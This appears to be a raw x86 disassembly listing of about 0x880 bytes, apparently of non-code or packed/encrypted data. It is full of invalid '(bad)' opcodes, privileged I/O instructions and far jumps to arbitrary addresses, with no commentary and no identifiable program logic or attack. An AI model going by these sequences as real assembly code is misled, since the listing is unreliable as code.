  410de1:	retf   
  410de2:	xor    al,0xa
  410de4:	retf   
  410de5:	lods   eax,DWORD PTR ds:[esi]
  410de6:	jge    0x410d92
  410de8:	add    dh,BYTE PTR [ecx]
  410dea:	shl    DWORD PTR [eax-0xa],cl
  410ded:	addr16 aas 
  410def:	jae    0x410d71
  410df1:	and    eax,0x72dc2115
  410df6:	fwait
  410df7:	inc    ecx
  410df8:	dec    esp
  410df9:	dec    esi
  410dfa:	jae    0x410de2
  410dfc:	lock mov ah,0xeb
  410dff:	out    0x20,eax
  410e01:	jp     0x410dbb
  410e03:	pop    ds
  410e04:	icebp  
  410e05:	or     ah,bl
  410e07:	cmp    al,0x2
  410e09:	inc    edi
  410e0a:	add    dh,bh
  410e0c:	popf   
  410e0d:	push   edi
  410e0e:	cmp    eax,0x2afb0784
  410e13:	int3   
  410e14:	repnz push edx
  410e16:	test   al,0x49
  410e18:	mov    bl,0x9
  410e1a:	hlt    
  410e1b:	dec    eax
  410e1c:	adc    bh,BYTE PTR [eax]
  410e1e:	lock add al,0x18
  410e21:	xor    DWORD PTR [edx-0x32],0xffffff91
  410e25:	sub    ch,al
  410e27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e28:	call   0x587445f0
  410e2d:	jno    0x410eac
  410e2f:	imul   esi,DWORD PTR [ebx+0x45],0xa6de87a5
  410e36:	mov    ch,0x69
  410e38:	ja     0x410e60
  410e3a:	xchg   esp,eax
  410e3b:	adc    eax,DWORD PTR [ecx-0x5b8b5743]
  410e41:	cwde   
  410e42:	fld    DWORD PTR [ecx]
  410e44:	ret    0x5bde
  410e47:	dec    eax
  410e48:	call   0xafd9:0xdd2a46d6
  410e4f:	(bad)  
  410e51:	pusha  
  410e52:	popa   
  410e53:	xchg   esp,eax
  410e55:	push   0x36b416d9
  410e5a:	div    BYTE PTR [eax-0x4af02715]
  410e60:	mov    ebp,DWORD PTR [edi]
  410e62:	lahf   
  410e63:	scas   eax,DWORD PTR es:[edi]
  410e64:	rcr    DWORD PTR [ebp+0x65],1
  410e67:	jno    0x410e00
  410e69:	inc    edx
  410e6a:	mov    cl,0x95
  410e6c:	(bad)  
  410e6d:	idiv   BYTE PTR ds:0x825c2bab
  410e73:	xchg   edx,eax
  410e74:	dec    eax
  410e75:	mov    bh,0x2d
  410e77:	lock dec esi
  410e79:	mov    ss,WORD PTR [ecx-0x75]
  410e7c:	xchg   ebp,eax
  410e7d:	sub    edx,DWORD PTR [edx+0x6]
  410e80:	into   
  410e81:	iret   
  410e82:	dec    edx
  410e83:	arpl   WORD PTR [esp+ecx*1-0x1f85a903],ax
  410e8a:	pop    es
  410e8b:	or     ebx,DWORD PTR [ebx-0x40]
  410e8e:	imul   ecx,DWORD PTR ds:0x229ed4d1,0x31756cb3
  410e98:	mov    DWORD PTR [esi-0x41],edi
  410e9b:	sbb    eax,0x45cb3c7d
  410ea0:	cli    
  410ea1:	fdivr  QWORD PTR [esi]
  410ea3:	mov    edi,ebx
  410ea5:	and    esi,DWORD PTR [ebp+0x5cc32de]
  410eab:	test   al,0xfb
  410ead:	inc    ecx
  410eae:	pop    edi
  410eaf:	std    
  410eb0:	mov    ch,0x1
  410eb2:	leave  
  410eb3:	shr    DWORD PTR [edx+0x1480933e],1
  410eb9:	jb     0x410ec5
  410ebb:	call   0x16c189d9
  410ec0:	cmp    BYTE PTR [edi],al
  410ec2:	rol    BYTE PTR [edi-0x104f2617],1
  410ec8:	pop    esi
  410ec9:	addr16 aad 0x98
  410ecc:	mov    cs,WORD PTR [esi+edx*1-0x53]
  410ed0:	js     0x410e8b
  410ed2:	pop    es
  410ed3:	xchg   ebp,eax
  410ed4:	push   esp
  410ed5:	scas   al,BYTE PTR es:[edi]
  410ed6:	sub    ebp,DWORD PTR [ebx]
  410ed8:	in     eax,dx
  410ed9:	dec    eax
  410eda:	inc    ecx
  410edb:	int3   
  410edc:	in     al,0xc3
  410ede:	in     eax,dx
  410edf:	loope  0x410ea6
  410ee1:	sbb    esp,ebx
  410ee3:	xchg   DWORD PTR [ecx-0x5394786e],ebp
  410ee9:	es jmp 0x410e98
  410eec:	jmp    0xaec2:0xdaae740b
  410ef3:	cmp    ecx,eax
  410ef5:	data16 jmp 0x410eba
  410ef8:	fild   QWORD PTR [edx-0x5c]
  410efb:	push   es
  410efc:	outs   dx,DWORD PTR ds:[esi]
  410efd:	cmp    al,0xc2
  410eff:	fdivr  QWORD PTR [edx]
  410f01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f02:	sbb    al,0x5a
  410f04:	pop    ebp
  410f05:	nop
  410f06:	add    al,0x9
  410f08:	push   ebx
  410f09:	push   ss
  410f0a:	fimul  DWORD PTR [eax+esi*4]
  410f0d:	or     edx,DWORD PTR [ebx-0x5c]
  410f10:	mov    DWORD PTR [ecx-0x55],ecx
  410f13:	rcr    DWORD PTR [edx-0x5],1
  410f16:	sub    BYTE PTR [eax+0x6a43d8e0],0x41
  410f1d:	in     al,dx
  410f1e:	lahf   
  410f1f:	push   edx
  410f20:	loopne 0x410eb2
  410f22:	sub    al,0x99
  410f24:	jg     0x410ec9
  410f26:	mov    BYTE PTR [esi+0x4f],bl
  410f29:	dec    eax
  410f2a:	push   es
  410f2b:	xchg   esp,eax
  410f2c:	pop    esi
  410f2d:	fdiv   QWORD PTR ss:[ebp+0x567eb4b3]
  410f34:	int    0xcf
  410f36:	addr16 adc eax,0xb7e55fce
  410f3c:	clc    
  410f3d:	inc    ebx
  410f3e:	xlat   BYTE PTR ds:[ebx]
  410f3f:	fisubr WORD PTR [ebx]
  410f41:	inc    ebp
  410f42:	lea    edx,[eax-0x3e214610]
  410f48:	push   esp
  410f49:	or     ebp,DWORD PTR [ecx-0x7d]
  410f4c:	jne    0x410f73
  410f4e:	int    0x89
  410f50:	test   eax,0x5ad71864
  410f55:	adc    al,0xa7
  410f57:	push   0xee75754d
  410f5c:	xchg   edx,eax
  410f5d:	mov    edx,0x85df0353
  410f62:	iret   
  410f63:	lahf   
  410f64:	jno    0x410f44
  410f66:	jmp    0x12da5582
  410f6b:	nop
  410f6c:	cli    
  410f6d:	adc    edx,DWORD PTR [esi-0xe]
  410f70:	(bad)  
  410f72:	loopne 0x410fb4
  410f74:	fcmovnu st,st(4)
  410f76:	mov    WORD PTR [ecx+0x22],?
  410f79:	inc    ecx
  410f7a:	shl    DWORD PTR [ebp-0x13471185],0x4f
  410f81:	aad    0xcc
  410f83:	dec    esp
  410f84:	sub    BYTE PTR [esi-0x37efcf9b],al
  410f8a:	js     0x410ff1
  410f8c:	xchg   DWORD PTR [eax-0x31a3d613],ebp
  410f92:	std    
  410f93:	sbb    ecx,ecx
  410f95:	sub    DWORD PTR [eax],edx
  410f97:	sub    ecx,ebx
  410f99:	bnd jne 0x410f68
  410f9c:	inc    ebp
  410f9d:	mov    cl,0x58
  410f9f:	inc    ebp
  410fa0:	retf   
  410fa1:	fcomp  QWORD PTR [edx+0x6c5add21]
  410fa7:	xchg   edi,eax
  410fa8:	ins    DWORD PTR es:[edi],dx
  410fa9:	lahf   
  410faa:	xchg   ecx,eax
  410fab:	or     DWORD PTR [edx+ecx*2+0x4b],0x2942fd9e
  410fb3:	mov    dl,0xba
  410fb5:	sbb    al,0x86
  410fb7:	into   
  410fb8:	add    eax,DWORD PTR [ebx-0x220f15b6]
  410fbe:	dec    esi
  410fbf:	and    eax,0x6546c680
  410fc4:	daa    
  410fc5:	fild   DWORD PTR [ecx]
  410fc7:	not    DWORD PTR ds:0x33fdc218
  410fcd:	arpl   WORD PTR [edi+0x23],sp
  410fd0:	mov    WORD PTR [ecx-0x6243189c],?
  410fd6:	xor    DWORD PTR [eax],edi
  410fd8:	adc    eax,edx
  410fda:	lock sbb ebp,DWORD PTR [ebx+0x4473e433]
  410fe1:	call   0x915d:0x20df4d17
  410fe8:	(bad)  
  410fe9:	out    0xeb,al
  410feb:	scas   al,BYTE PTR es:[edi]
  410fec:	(bad)  
  410fed:	retf   
  410fee:	int    0x23
  410ff0:	je     0x410f9a
  410ff2:	xchg   esi,eax
  410ff3:	and    al,0xe7
  410ff5:	rcl    esi,1
  410ff7:	loope  0x41101a
  410ff9:	pop    edx
  410ffa:	inc    esi
  410ffb:	je     0x410fa4
  410ffd:	push   esi
  410ffe:	adc    DWORD PTR [ebp+ebp*1+0x6a],ecx
  411002:	mov    eax,0x661baa4e
  411007:	xor    al,0x4
  411009:	lods   al,BYTE PTR ds:[esi]
  41100a:	push   esi
  41100b:	(bad)  
  41100c:	xor    edi,DWORD PTR [edi+ebx*2]
  41100f:	add    esp,edx
  411011:	(bad)
  411014:	int    0x2a
  411016:	lds    esp,FWORD PTR [esi*2-0x71fb30ee]
  41101d:	pop    ebp
  41101e:	mov    bh,0x16
  411020:	in     al,0x31
  411022:	add    eax,0x17b05f0e
  411027:	pusha  
  411028:	pusha  
  411029:	and    eax,0xdaa2db78
  41102e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41102f:	jle    0x411046
  411031:	add    eax,0xc1ad2418
  411036:	mov    ds:0x89366a52,al
  41103b:	mov    BYTE PTR [ebx],dl
  41103d:	mov    ?,ebp
  41103f:	sbb    dl,0xfe
  411042:	push   esi
  411043:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411044:	icebp  
  411045:	pop    edx
  411046:	push   ebx
  411047:	inc    eax
  411048:	adc    al,0x5c
  41104a:	inc    eax
  41104b:	sbb    al,0xee
  41104d:	or     BYTE PTR [eax+0x13],ch
  411050:	out    dx,eax
  411051:	xchg   ebp,eax
  411052:	in     eax,0xf3
  411054:	push   ebp
  411055:	loop   0x411017
  411057:	nop
  411058:	mov    ds:0x79d2fd73,al
  41105d:	xchg   esp,eax
  41105e:	fcom   QWORD PTR [ecx+0x20]
  411061:	aas    
  411062:	mov    edi,0x63303eb2
  411067:	lods   eax,DWORD PTR ds:[esi]
  411068:	mov    BYTE PTR [esi],al
  41106a:	mov    edx,edx
  41106c:	daa    
  41106d:	jmp    0x3baf0165
  411072:	fisttp DWORD PTR [edx]
  411074:	inc    edi
  411075:	les    edx,FWORD PTR [ecx-0x7f]
  411078:	adc    DWORD PTR [ebp+0x2c9265f0],esi
  41107e:	push   esi
  41107f:	mov    ebx,0x5011d19d
  411084:	ss lahf 
  411086:	call   FWORD PTR [edx]
  411088:	pop    es
  411089:	mov    bh,0xb8
  41108b:	mov    ch,0x73
  41108d:	mov    ds:0xe1a855b8,eax
  411092:	sub    al,0x3b
  411094:	push   esp
  411095:	out    dx,al
  411096:	sbb    DWORD PTR [eax+ecx*4-0x534f5db7],edi
  41109d:	cli    
  41109e:	push   0xa3ee404a
  4110a3:	mov    ebp,0x59a9cb25
  4110a8:	and    cl,bl
  4110aa:	ins    DWORD PTR es:[edi],dx
  4110ab:	mov    dh,0x2f
  4110ad:	test   ch,dh
  4110af:	xchg   ebx,eax
  4110b0:	addr16 in eax,0x46
  4110b3:	mov    BYTE PTR [edi],cl
  4110b5:	inc    eax
  4110b6:	mov    edx,0xcb5f9740
  4110bb:	fwait
  4110bc:	loopne 0x4110ec
  4110be:	setns  cl
  4110c1:	pop    ebp
  4110c2:	js     0x411063
  4110c4:	sti    
  4110c5:	mov    dl,0x7a
  4110c7:	adc    cl,BYTE PTR [ecx+eax*2]
  4110ca:	adc    bh,BYTE PTR [ebx]
  4110cc:	ss cli 
  4110ce:	sub    ah,BYTE PTR [ecx-0x7b0d3b94]
  4110d4:	(bad)  
  4110d5:	aaa    
  4110d6:	and    eax,0x724872ac
  4110db:	push   ss
  4110dc:	cmp    BYTE PTR [esi+edx*8-0x32],al
  4110e0:	jmp    0x38aeb1f8
  4110e5:	lock repnz rcl BYTE PTR [ecx+0x5d02aa66],0x17
  4110ee:	stos   BYTE PTR es:[edi],al
  4110ef:	fidivr DWORD PTR [edi+0x306bd766]
  4110f5:	jae    0x4110dd
  4110f7:	mov    ebx,0x8b69919f
  4110fc:	loop   0x4110b2
  4110fe:	and    BYTE PTR ds:0x90b69ede,al
  411104:	cs and eax,0x98952df0
  41110a:	daa    
  41110b:	in     al,0xc5
  41110d:	adc    ebx,DWORD PTR [edx]
  41110f:	pop    esi
  411110:	and    bl,BYTE PTR [esi]
  411112:	shl    DWORD PTR [edx+0x5943120c],0xd8
  411119:	push   eax
  41111a:	enter  0x64d9,0x8b
  41111e:	fist   DWORD PTR [eax]
  411120:	adc    al,0x5f
  411122:	jp     0x41110b
  411124:	clc    
  411125:	ret    0xffd5
  411128:	cwde   
  411129:	fld    DWORD PTR [ebx+0x10cd7630]
  41112f:	shl    BYTE PTR [eax+0x20e5deda],1
  411135:	fidiv  DWORD PTR [esi+0x28]
  411138:	test   DWORD PTR [edi+0x61cff24e],edx
  41113e:	pop    edx
  41113f:	daa    
  411140:	pop    ecx
  411141:	mov    al,0x6d
  411143:	pop    eax
  411144:	push   0xda206e6b
  411149:	test   eax,0x37a67e61
  41114e:	xchg   esp,eax
  41114f:	loop   0x411177
  411151:	jmp    0x4110dc
  411153:	add    DWORD PTR [esi-0x66fbfc68],edi
  411159:	sub    ah,BYTE PTR [esp+ebx*1+0x6b4b5f29]
  411160:	pop    ss
  411161:	xor    BYTE PTR [edx-0x20c69e22],bl
  411167:	xor    ebp,esi
  411169:	ins    DWORD PTR es:[edi],dx
  41116a:	mov    esp,0x639a3985
  41116f:	leave  
  411170:	test   eax,0xe8297ee5
  411175:	mov    DWORD PTR [edi+0x68],edx
  411178:	dec    ebp
  411179:	push   esp
  41117a:	test   edi,0x8cb1e534
  411180:	ds scas al,BYTE PTR es:[edi]
  411182:	and    DWORD PTR [ebp+0x1019f59e],0xf0a36ef0
  41118c:	inc    ebp
  41118d:	imul   esp,edx,0x8fe3fcf1
  411193:	in     eax,0x84
  411195:	push   esp
  411196:	mov    cl,0x61
  411198:	dec    edx
  411199:	mov    DWORD PTR [ecx],ebx
  41119b:	bound  edi,QWORD PTR ds:0xebcdc106
  4111a1:	sbb    dh,BYTE PTR ds:0x76680539
  4111a7:	push   0x814f8fbe
  4111ac:	inc    esp
  4111ad:	add    ebx,ebx
  4111af:	(bad)  
  4111b1:	imul   edx,DWORD PTR [esi],0xffffff9e
  4111b4:	(bad)  
  4111b5:	mov    ebx,0x869f7ef3
  4111ba:	popf   
  4111bb:	or     eax,0x2056715f
  4111c0:	pop    esp
  4111c1:	ret    0x44bb
  4111c4:	jge    0x411206
  4111c6:	xchg   dl,al
  4111c8:	push   DWORD PTR [edx*8+0x7ccc6af6]
  4111cf:	and    DWORD PTR [eax+0x6e256abf],ebx
  4111d5:	mov    ebp,DWORD PTR [ebx]
  4111d7:	push   es
  4111d8:	ficomp WORD PTR [ecx]
  4111da:	int    0x39
  4111dc:	out    0x26,eax
  4111de:	add    al,0x24
  4111e0:	and    DWORD PTR [ebx-0x48],esp
  4111e3:	pop    edi
  4111e4:	sbb    bl,bl
  4111e6:	inc    eax
  4111e7:	ror    DWORD PTR [ebx-0x717b8cc0],0xee
  4111ee:	pop    edx
  4111ef:	dec    edi
  4111f0:	inc    edx
  4111f1:	in     al,0x29
  4111f3:	jne    0x4111ae
  4111f5:	inc    ecx
  4111f6:	inc    ecx
  4111f7:	gs pop esp
  4111f9:	xchg   DWORD PTR [ebx+esi*1+0x50],edi
  4111fd:	cmc    
  4111fe:	push   ss
  4111ff:	enter  0x4445,0xb2
  411203:	rcl    BYTE PTR [ebx-0x2e5fed1b],1
  411209:	cmc    
  41120a:	pop    edx
  41120b:	es mov ch,0xe3
  41120e:	outs   dx,BYTE PTR ds:[esi]
  41120f:	es sbb dh,bl
  411212:	jmp    0x41125f
  411214:	fdiv   DWORD PTR [ebx+0x2c5b3ad3]
  41121a:	test   al,0xcf
  41121c:	outs   dx,DWORD PTR ds:[esi]
  41121d:	clc    
  41121e:	sub    al,0x9
  411220:	lods   eax,DWORD PTR ds:[esi]
  411221:	xchg   edi,eax
  411222:	xlat   BYTE PTR ds:[ebx]
  411223:	repz dec ebp
  411225:	fwait
  411226:	out    0xdc,al
  411228:	mov    esp,0xbb9e7f6
  41122d:	leave  
  41122e:	fld    QWORD PTR [esp+ebp*2+0x43d3cf2c]
  411235:	in     eax,dx
  411236:	loope  0x41126f
  411238:	mov    WORD PTR [edi+0x2c],?
  41123b:	add    edx,DWORD PTR [ecx+edx*4]
  41123e:	(bad)  
  41123f:	xchg   esp,eax
  411240:	push   es
  411241:	ret    
  411242:	test   al,0x46
  411244:	add    DWORD PTR [ebx],edx
  411246:	and    ecx,edx
  411248:	sub    edx,esp
  41124a:	adc    DWORD PTR [ecx-0x5c02e1e],edx
  411250:	pop    eax
  411251:	stos   DWORD PTR es:[edi],eax
  411252:	shr    DWORD PTR [edx-0x62ed69e0],cl
  411258:	dec    eax
  411259:	push   ds
  41125a:	cmc    
  41125b:	adc    eax,0xf290f13e
  411260:	ror    DWORD PTR [edx],cl
  411262:	adc    eax,0x4e55d83f
  411267:	pushf  
  411268:	add    eax,0x53860025
  41126d:	lahf   
  41126e:	inc    esi
  41126f:	enter  0xd1ce,0xb5
  411273:	mov    BYTE PTR [esi+0x57],bh
  411276:	sar    BYTE PTR [ecx+ebp*2],1
  411279:	outs   dx,DWORD PTR ds:[esi]
  41127a:	cwde   
  41127b:	rol    edx,cl
  41127d:	xchg   edi,eax
  41127e:	adc    ah,BYTE PTR [esp+edx*1]
  411281:	fistp  WORD PTR [edx-0x52434953]
  411287:	push   ebx
  411288:	aas    
  411289:	mov    eax,0xe6f9ace6
  41128e:	inc    esp
  41128f:	pop    es
  411290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411291:	push   esi
  411292:	int3   
  411293:	mov    bl,0x95
  411295:	and    DWORD PTR [edx+edx*4-0x5b],0xffffff9d
  41129a:	lods   eax,DWORD PTR ds:[esi]
  41129b:	push   es
  41129c:	cwde   
  41129d:	push   ecx
  41129e:	sahf   
  41129f:	cdq    
  4112a0:	fmulp  st(1),st
  4112a2:	sahf   
  4112a3:	outs   dx,BYTE PTR ds:[esi]
  4112a4:	and    eax,0x36076e6f
  4112a9:	mov    esi,0x4faa76cd
  4112ae:	or     BYTE PTR [ebp+0x3b],0x3c
  4112b2:	(bad)  
  4112b3:	dec    eax
  4112b4:	std    
  4112b5:	sbb    eax,0xb08b5b49
  4112ba:	iret   
  4112bb:	cli    
  4112bc:	(bad)  
  4112be:	in     al,dx
  4112bf:	jo     0x41127b
  4112c1:	pushf  
  4112c2:	loope  0x41126a
  4112c4:	and    al,0xb9
  4112c6:	shl    ebp,0xf7
  4112c9:	call   0x8e76:0x9659c577
  4112d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112d1:	test   DWORD PTR [ebp+0x1d51e698],esi
  4112d7:	cli    
  4112d8:	mov    eax,0x1766e390
  4112dd:	pop    ebp
  4112de:	stos   DWORD PTR es:[edi],eax
  4112df:	out    0x12,eax
  4112e1:	cmp    dl,BYTE PTR [ebp-0x61790433]
  4112e7:	mov    dh,0x90
  4112e9:	lea    esp,[eax-0x74ddc97f]
  4112ef:	push   ds
  4112f0:	add    DWORD PTR [edx+0x1fcc2e1e],eax
  4112f6:	and    eax,0xa1d0a060
  4112fb:	sbb    eax,0x271b98c
  411300:	clc    
  411301:	adc    ch,BYTE PTR [ebx]
  411303:	sbb    al,0x91
  411305:	stos   DWORD PTR es:[edi],eax
  411306:	add    dl,BYTE PTR [edi-0xb]
  411309:	cwde   
  41130a:	std    
  41130b:	mov    esi,DWORD PTR [eax-0x48]
  41130e:	scas   eax,DWORD PTR es:[edi]
  41130f:	mov    esi,0x1648a87a
  411314:	mov    edi,0x3ec70159
  411319:	cmp    eax,eax
  41131b:	xchg   BYTE PTR [ecx],al
  41131d:	xchg   esp,eax
  41131e:	xchg   esi,eax
  41131f:	xor    al,0x72
  411321:	aas    
  411322:	add    cl,BYTE PTR [ecx+0x7b16d21]
  411328:	jne    0x41134b
  41132a:	in     eax,dx
  41132b:	add    edi,DWORD PTR [edx]
  41132d:	sbb    ecx,DWORD PTR [ebx+ebp*1+0x14f17db]
  411334:	(bad)  
  411335:	mov    ?,WORD PTR [edx-0x3fcb0ef3]
  41133b:	popa   
  41133c:	cmp    al,0xfe
  41133e:	xor    ebp,0x3f7e11b7
  411344:	mov    cl,0x52
  411346:	cwde   
  411347:	test   al,0x13
  411349:	mov    cl,ch
  41134b:	call   0x6c94:0x75493ff3
  411352:	add    DWORD PTR [ecx-0x34],eax
  411355:	dec    esp
  411356:	aaa    
  411357:	xor    al,0xc8
  411359:	adc    DWORD PTR [eax+0x19],0x22
  41135d:	jl     0x41139e
  41135f:	loope  0x41136a
  411361:	push   es
  411362:	cmp    eax,0xd2772375
  411367:	sti    
  411368:	jne    0x4113ba
  41136a:	add    esi,ebp
  41136c:	(bad)  
  41136d:	out    0x61,eax
  41136f:	or     al,0xa5
  411371:	cmp    edx,DWORD PTR [ecx+0x7e813027]
  411377:	test   edi,eax
  411379:	sbb    edi,DWORD PTR [edi+edx*1]
  41137c:	push   ss
  41137d:	adc    al,0x41
  41137f:	loop   0x4113d1
  411381:	ror    al,0x65
  411384:	stos   BYTE PTR es:[edi],al
  411385:	loopne 0x41133f
  411387:	retf   0xc1f6
  41138a:	push   ebp
  41138b:	add    eax,0xf86f17d7
  411390:	jno    0x41131d
  411392:	rcr    BYTE PTR [esi-0x6c],0xfd
  411396:	repnz cli 
  411398:	or     ah,BYTE PTR [esi+0x69]
  41139b:	mov    cl,0x96
  41139d:	push   ds
  41139e:	push   edx
  41139f:	sar    DWORD PTR [ecx],1
  4113a1:	push   ecx
  4113a2:	int    0xaf
  4113a4:	popa   
  4113a5:	in     eax,0x7e
  4113a7:	jle    0x411398
  4113a9:	dec    eax
  4113aa:	sbb    al,0x9
  4113ac:	and    dl,cl
  4113ae:	jg     0x4113a4
  4113b0:	fwait
  4113b1:	mov    al,0x66
  4113b3:	in     al,0x2
  4113b5:	int    0x40
  4113b7:	add    eax,0x72786e3d
  4113bc:	retf   0x47f8
  4113bf:	fwait
  4113c0:	popa   
  4113c1:	rcr    DWORD PTR [ecx-0x21d55dc8],1
  4113c7:	mov    ds:0x5a1e0e1b,al
  4113cc:	sbb    ch,BYTE PTR [eax]
  4113ce:	arpl   WORD PTR [edi],dx
  4113d0:	pusha  
  4113d1:	or     dh,cl
  4113d3:	add    al,0xb7
  4113d5:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4113d7:	neg    BYTE PTR [edx]
  4113d9:	(bad)  
  4113da:	fisttp DWORD PTR [edx]
  4113dc:	sbb    DWORD PTR [ecx-0x71],edx
  4113df:	popa   
  4113e0:	adc    DWORD PTR es:[ecx-0x4366f013],0x949b690a
  4113eb:	shl    BYTE PTR [ecx-0x32],1
  4113ee:	jp     0x4113f9
  4113f0:	in     al,dx
  4113f1:	cld    
  4113f2:	or     BYTE PTR [eax+0x30370564],bl
  4113f8:	ss push eax
  4113fa:	jl     0x411390
  4113fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113fd:	mov    cl,0x8a
  4113ff:	mov    cl,0xf3
  411401:	pop    esp
  411402:	rcr    bl,cl
  411404:	mov    dh,0x21
  411406:	mov    dh,0x85
  411408:	stc    
  411409:	test   DWORD PTR [edx+0x4b],0xa26b069e
  411410:	pop    ds
  411411:	mov    esi,0xac6018c
  411416:	test   eax,0x3d06c508
  41141b:	arpl   WORD PTR [edx],sp
  41141d:	cmp    dl,BYTE PTR cs:[edx]
  411420:	rep ins DWORD PTR es:[edi],dx
  411422:	push   0xffffffcc
  411424:	and    ebp,DWORD PTR [ebx+0x14d7b175]
  41142a:	(bad)  [edi+0x41554e6b]
  411430:	pop    ecx
  411431:	xor    bh,bh
  411433:	aaa    
  411434:	mov    bl,0x21
  411436:	sbb    eax,0x64571ff
  41143b:	jmp    0x7247:0x38910a1
  411442:	pushf  
  411443:	sub    al,0xb7
  411445:	dec    edi
  411446:	push   esi
  411447:	clc    
  411448:	cmc    
  411449:	dec    edx
  41144a:	pop    edx
  41144b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41144c:	(bad)
  41144f:	(bad)  
  411450:	jmp    0x19fd:0xff568db3
  411457:	add    DWORD PTR ds:0xe3e5963,edi
  41145d:	fstp   QWORD PTR [esi]
  41145f:	pop    es
  411460:	cmc    
  411461:	sub    DWORD PTR [ecx-0xf07fddd],ecx
  411467:	inc    edi
  411468:	sbb    eax,0xc343212a
  41146d:	pop    esp
  41146e:	call   0x5cfb:0x558441ff
  411475:	jl     0x4114f5
  411477:	jae    0x411464
  411479:	outs   dx,DWORD PTR ds:[esi]
  41147a:	xor    eax,0x1c93c522
  41147f:	sub    eax,ecx
  411481:	sbb    eax,0xcc42f5e7
  411486:	pop    es
  411487:	jb     0x4114ef
  411489:	sub    al,0x6d
  41148b:	mov    eax,ds:0x83617f31
  411490:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411491:	(bad)  
  411493:	stos   DWORD PTR es:[edi],eax
  411494:	inc    eax
	...
  411511:	add    BYTE PTR [eax],al
  411513:	add    BYTE PTR [eiz*8+0x7fff35be],bh
  41151a:	mov    edi,0x96dab9ed
  41151f:	mov    ch,bh
  411521:	jb     0x4114b4
  411523:	cld    
  411524:	or     eax,0x690000bf
  411529:	pop    es
  41152a:	add    BYTE PTR [eax],al
  41152c:	jno    0x4115ab
  41152e:	ret    
  41152f:	cmp    cl,ch
  411531:	pop    esp
  411532:	mov    DWORD PTR [ecx+eax*2],edi
  411535:	xor    DWORD PTR [edx],edi
  411537:	dec    edi
  411538:	les    ecx,FWORD PTR [edi-0x7c532b83]
  41153e:	dec    esi
  41153f:	cwde   
  411540:	sbb    eax,0x391887a6
  411545:	dec    ebx
  411546:	pop    esp
  411547:	fidiv  WORD PTR [edi+0x7f8118e6]
  41154d:	and    BYTE PTR [edi-0x24ec08bb],cl
  411553:	pop    ebp
  411554:	pop    esp
  411555:	cwde   
  411556:	dec    edi
  411557:	jg     0x411553
  411559:	inc    ecx
  41155a:	or     BYTE PTR ds:0x3d153ffc,bh
  411560:	call   0x43d0fe36
  411565:	adc    eax,0x579adbe7
  41156a:	pop    ecx
  41156b:	call   0x3ac0:0xdf49d025
  411572:	dec    esi
  411573:	in     al,0xe8
  411575:	into   
  411576:	lds    esi,FWORD PTR [ebp-0x9233cd5]
  41157c:	xor    dl,dh
  41157e:	in     eax,0xd9
  411580:	xor    eax,DWORD PTR [esi]
  411582:	sbb    esi,DWORD PTR [edx-0x7c20f798]
  411588:	xchg   edi,eax
  411589:	shl    BYTE PTR [edi-0x52],1
  41158c:	sub    eax,0x209fc99f
  411591:	call   0x1324f8be
  411596:	or     DWORD PTR [eax+ebp*1-0x52],edi
  41159a:	imul   esp,eax,0xebecf694
  4115a0:	adc    eax,0x4a1e20a4
  4115a5:	pop    edx
  4115a6:	mov    al,ds:0xca3bc9a0
  4115ab:	xchg   edx,eax
  4115ac:	push   eax
  4115ad:	ins    DWORD PTR es:[edi],dx
  4115ae:	push   esp
  4115af:	pop    eax
  4115b0:	idiv   DWORD PTR ds:0xf6df3425
  4115b6:	push   edx
  4115b7:	mov    eax,0x3dbab04a
  4115bc:	mov    al,ds:0x200aeb71
  4115c1:	mov    esi,DWORD PTR [eax]
  4115c3:	cli    
  4115c4:	iret   
  4115c5:	frndint 
  4115c7:	in     eax,dx
  4115c8:	jb     0x41155a
  4115ca:	clc    
  4115cb:	cdq    
  4115cc:	or     al,0x46
  4115ce:	call   0x2f3e:0xdc6072a3
  4115d5:	and    dl,BYTE PTR [ebx]
  4115d7:	faddp  st(7),st
  4115d9:	ret    
  4115da:	repnz shr DWORD PTR [ebx-0x74b53540],0x67
  4115e2:	sub    eax,0xf5725816
  4115e7:	jmp    0x1d62:0xcf2aa579
  4115ee:	data16 fucom st(5)
  4115f1:	test   al,0x7e
  4115f3:	into   
  4115f4:	push   esp
  4115f5:	scas   eax,DWORD PTR es:[edi]
  4115f6:	xor    bh,BYTE PTR [ebx-0x5ab76335]
  4115fc:	sbb    al,0x37
  4115fe:	test   al,0xd1
  411600:	test   al,0x6e
  411602:	xchg   edx,eax
  411603:	xlat   BYTE PTR ds:[ebx]
  411604:	je     0x4115f7
  411606:	xor    DWORD PTR [ebx],ebp
  411608:	hlt    
  411609:	xlat   BYTE PTR ds:[ebx]
  41160a:	cmp    al,0x57
  41160c:	mov    eax,0x12a2948c
  411611:	popf   
  411612:	adc    ecx,esi
  411614:	mov    al,ds:0x4159bccb
  411619:	and    al,0x29
  41161b:	dec    eax
  41161c:	jmp    0x41168f
  41161e:	sbb    edi,eax
  411620:	dec    edx
  411621:	cmp    BYTE PTR [edi+0x3a],al
  411624:	fadd   st,st(4)
  411626:	cld    
  411627:	(bad)  
  411628:	ss fs inc esi
  41162b:	xchg   al,dh
  41162d:	std    
  41162e:	daa    
  41162f:	ja     0x41162b
  411631:	loope  0x411657
  411633:	inc    edi
  411634:	mov    dh,0xe
  411636:	mov    bh,0x81
  411638:	aaa    
  411639:	and    eax,0xc014adb6
  41163e:	(bad)  
  41163f:	jp     0x4115d2
  411641:	adc    ah,bh
  411643:	out    dx,al
  411644:	in     al,0xf
  411646:	sbb    BYTE PTR [ebx],0x57
  411649:	xchg   edx,eax
  41164a:	inc    esi
  41164b:	sub    BYTE PTR [ecx-0x2d],ah
  41164e:	dec    eax
  41164f:	int    0x37
  411651:	sti    
  411652:	rcl    DWORD PTR [ebx+eiz*4-0xd],cl
  411656:	and    eax,DWORD PTR [esi-0x6f]
  411659:	inc    eax
  41165a:	sbb    ch,ch
  41165c:	dec    ebx
  41165d:	mov    bh,0xf6
  41165f:	icebp  
  411660:	jp     0x411681
  411662:	aad    0x1c
